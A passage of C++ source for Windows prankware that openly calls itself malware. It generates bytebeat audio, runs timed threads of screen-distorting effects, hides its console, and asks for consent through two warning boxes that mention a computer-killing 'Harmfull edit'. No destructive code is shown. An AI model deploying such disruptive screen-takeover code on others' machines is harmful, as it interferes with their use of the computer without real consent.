        buffer[t] = static_cast<char>((t & 4096 ? (t * (t ^ t % 255) | t >> 4) >> 1 : t >> 3 | (t & 8192 ? t << 2 : t)) ^ ((int)(t & 8192 ? t & 4096 ? t & 1024 ? 2 * t : 4 * t : t & 512 ? 4 * t : 4.2 * t : (t & 4096 ? t & 1024 ? 2 * t : 10 * t : t & 512 ? 2 * t : 8 * t) >> 2) * (t & 16384 ? 3 : 2) | t * (int)(t & 16384 ? 1 / 8 : 1 / (0.01 * t)) >> 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (4 + (t >> 9) % 3) & t / 3 >> 7 & 224) ^ (rand() % 50));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t >> 20 * (t >> 11)) | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if ((t >> 13 ^ t >> 8) != 0) { buffer[t] = static_cast<char>(t * t / (t >> 13 ^ t >> 8)); }
        else { buffer[t] = static_cast<char>(0); }
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {//made by myself
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * "114514"[t%5] * (t * 54188 - 1919810 >> t * 91));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & t >> 7) | t << 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(43 * (t >> 41 | t >> 2) | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (0x78917891 >> (t >> 8)) | t >> 8) + (rand() % 48));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + (t * (t >> 5 | t / 32 & t) / 2 & (t & 1233 ? t >> 9 : t >> 8)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((0 - t) * (t >> 3 | t >> 4 | t >> 5 | t >> 6 | t >> 7) - t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void SPtime() {
    Sleep(30000);
}
void clean() {
    InvalidateRect(0, 0, 0);
}
void runSP() {
    HANDLE wnd1 = CreateThread(NULL, 0, Window1, NULL, 0, NULL);
    HANDLE wnd2 = CreateThread(NULL, 0, Window2, NULL, 0, NULL);
    HANDLE cur1 = CreateThread(NULL, 0, Cursor1, NULL, 0, NULL);
    Sleep(100);
    sound1();
    HANDLE th1 = CreateThread(NULL, 0, Shader1_Gray, NULL, 0, NULL);
    SPtime();
    TerminateThread(th1, 0);
    clean();
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader2_Wrinkle, NULL, 0, NULL);
    SPtime();
    TerminateThread(th2, 0);
    clean();
    sound3();
    HANDLE th3_a = CreateThread(NULL, 0, Shader3_a_GrayBlock, NULL, 0, NULL);
    HANDLE th3_b = CreateThread(NULL, 0, Shader3_b_Rainble, NULL, 0, NULL);
    SPtime();
    TerminateThread(th3_a, 0);
    TerminateThread(th3_b, 0);
    clean();
    sound4();
    HANDLE th4_a = CreateThread(NULL, 0, Payload1_a_Rotate, NULL, 0, NULL);
    HANDLE th4_b = CreateThread(NULL, 0, Payload1_b_DrawCat, NULL, 0, NULL);
    SPtime();
    TerminateThread(th4_a, 0);
    clean();
    sound5();
    HANDLE th5 = CreateThread(NULL, 0, Shader4_Wall, NULL, 0, NULL);
    SPtime();
    TerminateThread(th5, 0);
    clean();
    sound6();
    HANDLE th6 = CreateThread(NULL, 0, Shader5_Rainble2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th6, 0);
    clean();
    sound7();
    HANDLE th7 = CreateThread(NULL, 0, Shader6_Gourd, NULL, 0, NULL);
    SPtime();
    TerminateThread(th7, 0);
    clean();
    sound8();
    HANDLE th8_a = CreateThread(NULL, 0, Payload2_a_ScreenErrorAndColourful, NULL, 0, NULL);
    HANDLE th8_b = CreateThread(NULL, 0, Payload2_b_DrawIcon, NULL, 0, NULL);
    SPtime();
    TerminateThread(th8_a, 0);
    clean();
    sound9();
    HANDLE th9 = CreateThread(NULL, 0, Shader7_Wall2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th9, 0);
    clean();
    sound10();
    HANDLE th10 = CreateThread(NULL, 0, Payload3_Big, NULL, 0, NULL);
    SPtime();
    TerminateThread(th10, 0);
    TerminateThread(th4_b, 0);
    clean();
    sound11();
    HANDLE th11_a = CreateThread(NULL, 0, Payload4_a_CircleZ, NULL, 0, NULL);
    HANDLE th11_b = CreateThread(NULL, 0, Payload4_b_Blur, NULL, 0, NULL);
    HANDLE th11_c = CreateThread(NULL, 0, Payload4_c_TextOut, NULL, 0, NULL);
    HANDLE th11_d = CreateThread(NULL, 0, Payload4_d_Cube, NULL, 0, NULL);
    SPtime();
    TerminateThread(th11_a, 0);
    TerminateThread(th11_b, 0);
    clean();
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Shader8_Gourd2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th12, 0);
    clean();
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader9_NoName, NULL, 0, NULL);
    SPtime();
    TerminateThread(th13, 0);
    clean();
    sound14();
    HANDLE th14 = CreateThread(NULL, 0, Shader10_Wall3, NULL, 0, NULL);
    SPtime();
    TerminateThread(th14, 0);
    clean();
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader11_NoName2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th15, 0);
    TerminateThread(th11_c, 0);
    clean();
    sound16();
    HANDLE th16 = CreateThread(NULL, 0, Payload5_Swirl, NULL, 0, NULL);
    SPtime();
    TerminateThread(th16, 0);
    TerminateThread(th11_d, 0);
    clean();
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader12_NoName3, NULL, 0, NULL);
    SPtime();
    TerminateThread(th17, 0);
    clean();
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader13_NoName4, NULL, 0, NULL);
    SPtime();
    TerminateThread(th18, 0);
    TerminateThread(th8_b, 0);
    clean();
    sound19();
    HANDLE th19 = CreateThread(NULL, 0, Payload6_Big2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th19, 0);
    clean();
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader14_NoName5, NULL, 0, NULL);
    SPtime();
    clean();
    sound21();
    HANDLE th21 = CreateThread(NULL, 0, Shader15_Wall4_last, NULL, 0, NULL);
    SPtime();
    TerminateThread(th20, 0);
    TerminateThread(wnd1, 0);
    TerminateThread(wnd2, 0);
    TerminateThread(cur1, 0);
    clean();
}
void InitDPI() {
    HMODULE hModUser32 = LoadLibraryW(L"user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
    if (SetProcessDPIAware)
        SetProcessDPIAware();
    FreeLibrary(hModUser32);
}
DWORD xs;
void SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
int main() {
    InitDPI();
    srand(time(NULL));
    SeedXorshift32((DWORD)time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    LPCWSTR MessageTextFirst = L"Warning!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-YouAiYouAi";
    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"cmm1.0.exe-warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        if (MessageBoxW(0, MessageTextSecond, L"cmm1.0.exe-last warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { UnhookWindowsHookEx(hook); ExitProcess(0); }
        else {
            UnhookWindowsHookEx(hook);
            runSP();
        }
    }
    return 0;
}